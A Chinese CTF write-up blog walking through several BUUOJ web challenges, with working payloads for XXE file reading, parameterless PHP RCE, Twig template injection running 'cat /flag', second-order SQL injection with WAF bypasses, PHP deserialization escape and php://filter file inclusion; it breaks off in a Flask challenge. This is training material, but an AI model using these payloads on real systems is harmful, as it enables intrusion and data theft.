<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><code>xxe</code>攻击</p>
<p>抓包显示的结果是</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<p>是xml格式的数据，所以可能存在xxe漏洞（外部实体注入），即利用输入位置向存储的表中添加一个外部实体，让这个实体包含内部文件，造成数据泄露。</p>
<p>xml注入是利用闭合标签改写XML文件实现更改数据，xxe是引用外部实体来达到目的。</p>
<p>php引用外部实体，常见的协议</p>
<div class="hljs"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>://文件绝对路径 如：<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span>
<span class="hljs-keyword">http</span>://url/<span class="hljs-built_in">file</span>.txt
php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php</code></pre></div>

<p>这篇博客写的很清楚，<a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">传送门</a></p>
<p>直接构造payload，拿到flag</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"file:///flag"</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<blockquote>
<!ENTITY file SYSTEM  "file:///flag">

<p>这里的file是外部实体</p>
<p><username>&file;</username></p>
<p>这里的&amp;file是xml中的参数</p>
</blockquote>
<p>还可以用php://filter/read=convert.base64-encode/resource=xxx.php,读取源码</p>
<p>直接构造</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"php://filter/read=convert.base64-encode/resource=doLogin.php"</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<p>解码后的源码，可以拿到admin和密码，但是登录也没啥东西，考察点就是xxe。。。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment">* autor: c0ny1</span>
<span class="hljs-comment">* date: 2018-2-7</span>
<span class="hljs-comment">*/</span>

$USERNAME = <span class="hljs-string">'admin'</span>; <span class="hljs-comment">//璐﹀彿</span>
$PASSWORD = <span class="hljs-string">'024b87931a03f738fff6693ce0a78c88'</span>; <span class="hljs-comment">//瀵嗙爜</span>
$result = <span class="hljs-keyword">null</span>;

libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);
$xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);

<span class="hljs-keyword">try</span>&#123;
	$dom = <span class="hljs-keyword">new</span> DOMDocument();
	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds-&gt;username;
	$password = $creds-&gt;password;

	<span class="hljs-keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;
		$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">1</span>,$username);
	&#125;<span class="hljs-keyword">else</span>&#123;
		$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">0</span>,$username);
	&#125;	
&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-keyword">Exception</span> $e)&#123;
	$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">3</span>,$e-&gt;getMessage());
&#125;

header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>);
<span class="hljs-keyword">echo</span> $result;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>.git源码泄露</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag在哪里呢？&lt;br&gt;"</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'exp'</span>]))&#123;
    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
                <span class="hljs-comment">// echo $_GET['exp'];</span>
                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'exp'</span>]);
            &#125;
            <span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"还差一点哦！"</span>);
            &#125;
        &#125;
        <span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"再好好想想！"</span>);
        &#125;
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"还想读flag，臭弟弟！"</span>);
    &#125;
&#125;
<span class="hljs-comment">// highlight_file(__FILE__);</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>第一个<code>if</code>：常用的伪协议被禁了</p>
<p>第二个<code>if</code>正则匹配，<code>?R</code> 表示引用当前表达式，就比如引用一次：<br><code>[a-z,_]+[a-z,_]+\((?R)?\)</code>，所以一个合法的表达式可以是<code>a(b();)</code>，括号和字符组成的</p>
<p>第三个<code>if</code>就过滤一些函数包含的字符，导致了许多函数无法使用。</p>
<blockquote>
<p>1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 </p>
<p>2.过滤了常用的几个伪协议，不能以伪协议读取文件。 </p>
<p>3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 </p>
<p>4.正则匹配掉了et/na/info等关键字，很多函数都用不了。</p>
<p> 5：eval($_GET[‘exp’]); </p>
</blockquote>
<p>考察点无参RCE</p>
<p>exp：</p>
<div class="hljs"><pre><code class="hljs reasonml">?exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));</code></pre></div>

<p>这里用到反转函数是因为，flag.php在倒数第二个位置，无法使用end()获取，反转后可以直接受用next()获取，方便很多。</p>
<p><strong>localeconv()</strong> 函数返回一包含本地数字及货币格式信息的数组。</p>
<p><strong>current()</strong> 函数返回数组中的当前元素的值。</p>
<blockquote>
<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
<p><strong>提示：</strong>该函数不会移动数组内部指针。要做到这一点，请使用 <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">next()</a> 和 <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">prev()</a> 函数。</p>
<p>相关的方法：</p>
<ul>
<li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li>
</ul>
</blockquote>
<p><strong>array_reverse()</strong> 函数以相反的元素顺序返回数组。</p>
<p>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p>
<p>如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。</p>
<p><a href="https://www.w3school.com.cn/php/func_array_reverse.asp" target="_blank" rel="noopener">详情</a></p>
<p><strong>array_flip()</strong> 函数用于反转/交换数组中所有的键名以及它们关联的键值。</p>
<p>array_flip() 函数返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，所有其他的键名都将丢失。</p>
<p>如果原数组中的值的数据类型不是字符串或整数，函数将报错。</p>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>首先再hint.php中发现了提示</p>
<p><img src="https://i.loli.net/2020/12/16/uw4fMRbPYv2oHti.png" srcset="/img/loading.gif" alt="image-20201216083026655"></p>
<p>于是抓包看看cookie是啥，在flag.php页面随便登录后cookie后半段的值为用户名，尝试了sql注入，命令执行，都不是，于是试试了模板注入</p>
<p>user={{2*4}}，出现下图的样子，说明了括号中的表达式被执行了，所以确定是模板注入</p>
<p><img src="https://i.loli.net/2020/12/16/8irHUQKcXDZYMWv.png" srcset="/img/loading.gif" alt="image-20201216082222224"></p>
<p>下面就是要找到读取flag的payload</p>
<p>在网上找到了一个将模板注入说的很详细的博客，<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig" target="_blank" rel="noopener">传送门</a></p>
<p>下面需要判断这个题目是哪个类型的模板，结合下面的图片做测试</p>
<p><img src="https://i.loli.net/2020/12/16/GQid7jrR562I8te.png" srcset="/img/loading.gif" alt="image-20201216085015609"></p>
<p><img src="https://i.loli.net/2020/12/16/9SZY8zLwvtDeiyT.png" srcset="/img/loading.gif" alt="image-20201216084914194"></p>
<div class="hljs"><pre><code class="hljs angelscript">user=admin&#123;&#123;<span class="hljs-number">1</span>*<span class="hljs-number">2</span>&#125;&#125;*&#123;&#123;<span class="hljs-number">2</span>*<span class="hljs-number">3</span>&#125;&#125;</code></pre></div>

<p>结果回显的是hellow admin2*6，正好是上面图片的第一种情况，所以就是Twig模板</p>
<p>找到payload：</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">"cat /flag"</span>)&#125;&#125;</code></pre></div>



<p><img src="https://i.loli.net/2020/12/16/3TSMP4x7K5ujoYA.png" srcset="/img/loading.gif" alt="image-20201216084621589"></p>
<p>参考:<a href="https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#2-Twig" target="_blank" rel="noopener">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n’s Blog</a></p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册账号登录后，可以申请发布广告，在这个页面可以发现存在一个xxs，但是好像没法直接利用</p>
<p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094058451.png" srcset="/img/loading.gif" alt="image-20201216094058451"></p>
<p>测试是否存在sql注入</p>
<p>在申请广告是输入标题<code>1&#39;111</code>，提交正常，但是当查看广告详情的时候出现了报错页面，这也说明了存在sql注入,而且是二次注入</p>
<p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094728350.png" srcset="/img/loading.gif" alt="image-20201216094728350"></p>
<p><strong>0x1sql注入</strong></p>
<p>查看列数，空格是被加入了黑名单，使用/**/代替空格，一直加到了22才出现回显。</p>
<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>

<p><img src="https://i.loli.net/2020/12/16/YLCR8ODt2wiSWfZ.png" srcset="/img/loading.gif" alt="image-20201216095035895"></p>
<p>接下来就是查询库名，直接使用常规的查询方法会发现存在waf，无法使用，猜测可能是过滤or这个关键词，导致了information也被过滤了，那就换另外一种方法</p>
<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>sys.schema_auto_increment_colum
ns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">schema</span>()</code></pre></div>

<p>最后找到 了这个方法</p>
<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>

<p><img src="https://i.loli.net/2020/12/16/1e7KM9aCEkoI4GS.png" srcset="/img/loading.gif" alt="image-20201216101152422"></p>
<p>接下来就是获取列名，但是常规的方法还是不能用，应为还是存在information</p>
<p>那就使用一种新的查询方法，无列名查询</p>
<p>刚开始以为flag放在FLAG_TABLE中，但是提示不存在这个表，又试了试users表，在第三列读到了flag</p>
<p><img src="https://i.loli.net/2020/12/16/KiPL3omEjIanDcl.png" srcset="/img/loading.gif" alt="image-20201216103008504"></p>
<p>一开始以为users表的结构是两列，但是注入时会报错，说明不是两列，测试三列时就正常了，说明时三列</p>
<p><img src="https://i.loli.net/2020/12/16/Hm7NBTF32ED5gp4.png" srcset="/img/loading.gif" alt="image-20201216103553070"></p>
<p>查到第三列的时候看到了flag,payload如下</p>
<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(a)<span class="hljs-comment">/**/</span>from(select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>as<span class="hljs-comment">/**/</span>a<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>users)b),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>



<p>参考：<a href="https://www.jianshu.com/p/dc9af4ca2d06" target="_blank" rel="noopener">https://www.jianshu.com/p/dc9af4ca2d06</a></p>
<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

$function = @$_GET[<span class="hljs-string">'f'</span>];

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($img)</span></span>&#123;
    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'php'</span>,<span class="hljs-string">'flag'</span>,<span class="hljs-string">'php5'</span>,<span class="hljs-string">'php4'</span>,<span class="hljs-string">'fl1g'</span>);
    $filter = <span class="hljs-string">'/'</span>.implode(<span class="hljs-string">'|'</span>,$filter_arr).<span class="hljs-string">'/i'</span>;
    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">''</span>,$img);
&#125;

<span class="hljs-keyword">if</span>($_SESSION)&#123;
    <span class="hljs-keyword">unset</span>($_SESSION);
&#125;
$_SESSION[<span class="hljs-string">"user"</span>] = <span class="hljs-string">'guest'</span>;
$_SESSION[<span class="hljs-string">'function'</span>] = $function;
extract($_POST);

<span class="hljs-keyword">if</span>(!$function)&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;
&#125;

<span class="hljs-keyword">if</span>(!$_GET[<span class="hljs-string">'img_path'</span>])&#123;
    $_SESSION[<span class="hljs-string">'img'</span>] = base64_encode(<span class="hljs-string">'guest_img.png'</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
    $_SESSION[<span class="hljs-string">'img'</span>] = sha1(base64_encode($_GET[<span class="hljs-string">'img_path'</span>]));
&#125;

$serialize_info = filter(serialize($_SESSION));

<span class="hljs-keyword">if</span>($function == <span class="hljs-string">'highlight_file'</span>)&#123;
    highlight_file(<span class="hljs-string">'index.php'</span>);
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'phpinfo'</span>)&#123;
    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'phpinfo();'</span>); <span class="hljs-comment">//maybe you can find something in here!</span>
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'show_image'</span>)&#123;
    $userinfo = unserialize($serialize_info);
    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="hljs-string">'img'</span>]));
&#125;</code></pre></div>

<p>第33行代码提示了phpinfo中有隐藏的东西，GET提交<code>f=phpinfo</code>，会在里面找到一个文件的名字<strong>d0g3_f1ag.php</strong></p>
<p>那么接下来的目的就是通过一些方法读取到里面的信息。可以看到最后一行存在一个 file_get_content函数，结合题目标题，可以猜到是反序列化加文件读取的题目。</p>
<p><strong>0x1代码审计</strong></p>
<p>代码最后一行有一个<code>file_get_contents</code>是能够读取文件的函数，他这里读取的是base64解密的’img’,往前找这个’img’，可以发现如果我们有传入img_path，它会经过sha1加密，导致目标路径失效。如果我们没有传入img_path，那么后台将默认赋值为guest_img.png的base64编码。这样看来这个<code>$userinfo[&#39;img&#39;]</code>并不是我们可控的，此时需要把注意力转移到另外一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的<code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code>都会被空格替代，而这层过滤函数会干扰序列化后的数据。</p>
<p><strong>0x2php反序列化字符逃逸</strong></p>
<p>利用过滤函数而导致序列化结果产生新的结果，之前写过类似的<a href="https://sunzy.icu/2020/11/17/UNCTF/" target="_blank" rel="noopener">文章</a></p>
<p><img src="https://i.loli.net/2020/12/20/37JhPXH6GqbeuSI.png" srcset="/img/loading.gif" alt="image-20201220213459548"></p>
<p>这里重新构造出的序列化值为：</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"user"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">24</span>:<span class="hljs-string">""</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div>

<p>可以看到 真正的<code>$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;</code> 被抛弃掉了。这是因为我们在构造这段字符时是设计好长度的，<code>s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}</code>，这里的 } 与之前的 { 闭合，让反序列提前结束，从而看到反序列化的内容为</p>
<div class="hljs"><pre><code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta-string">"user"</span></span>]=&gt;
<span class="hljs-keyword">string</span>(<span class="hljs-number">24</span>) <span class="hljs-string">""</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;s:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>
[<span class="hljs-meta"><span class="hljs-meta-string">"img"</span></span>]=&gt;
<span class="hljs-keyword">string</span>(<span class="hljs-number">20</span>) <span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>
[<span class="hljs-meta"><span class="hljs-meta-string">"dd"</span></span>]=&gt;
<span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">"a"</span></code></pre></div>

<p>根据上面的构造方法，那么就可以将img字段的值改为phpinfo中给的文件名的base64值，从而读取其内容</p>
<p>构造payload</p>
<div class="hljs"><pre><code class="hljs php">get:f=show_image
post:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>]=<span class="hljs-title">a</span>"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div>

<p><img src="https://i.loli.net/2020/12/20/ESz2xIZWJD8j7Rk.png" srcset="/img/loading.gif" alt="image-20201220213803529"></p>
<p>提示了flag在这个文件中，那就将上面的img字段值换成这个文件名的base64值</p>
<div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">base64</span><span class="hljs-params">(/d0g3_fllllllag)</span></span> = L2QwZzNfZmxsbGxsbGFn</code></pre></div>

<p>payload:</p>
<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">get</span>:f=show_image		post:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";&#125;</code></pre></div>



<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>进入题目页面发现页面可以切换，并且url最后的参数也在改变，猜测可能存在文件包含</p>
<p>利用<code>php://filter</code>读取到index的源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$file = $_GET[<span class="hljs-string">'category'</span>];

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($file))&#123;
	<span class="hljs-keyword">if</span>( strpos( $file, <span class="hljs-string">"woofers"</span> ) !==  <span class="hljs-keyword">false</span> || strpos( $file, <span class="hljs-string">"meowers"</span> ) !==  <span class="hljs-keyword">false</span> || strpos( $file, <span class="hljs-string">"index"</span>))&#123;
		<span class="hljs-keyword">include</span> ($file . <span class="hljs-string">'.php'</span>);
	&#125;
	<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">echo</span> <span class="hljs-string">"Sorry, we currently only support woofers and meowers."</span>;
		&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>看上面的代码可以知道提交的文件必须包含 <code>woofers,neowers,index</code>中的一个才行</p>
<p>猜测flag放在flag.php中，尝试访问，看看有什么回显</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">category</span>=meowers/../flag</code></pre></div>

<p><img src="https://i.loli.net/2020/12/20/fFHTCIk9M5BK4t7.png" srcset="/img/loading.gif" alt="image-20201220231813354"></p>
<p>源码中出现了之前没有的内容，说明flag.php被包含进来了，那么就想办法读取到flag.php</p>
<p>想到的方法肯定还是上面堆区index源码的方法</p>
<p><code>php://filter/read=convert.base64-encode/resource=flag</code></p>
<p>但是这个没法绕过if语句的判断，所以需要嵌套一个符合的flie</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs livecodeserver">?category=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/woofers/resource=flag</code></pre></div>



<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><div class="hljs"><pre><code class="hljs php">import flask
import os

app = flask.Flask(__name__)

app.config[<span class="hljs-string">'FLAG'</span>] = os.environ.pop(<span class="hljs-string">'FLAG'</span>)


@app.route(<span class="hljs-string">'/'</span>)
def index():
    <span class="hljs-keyword">return</span> open(<span class="hljs-keyword">__file__</span>).read()


@app.route(<span class="hljs-string">'/shrine/&lt;path:shrine&gt;'</span>)
def shrine(shrine):

    def safe_jinja(s):
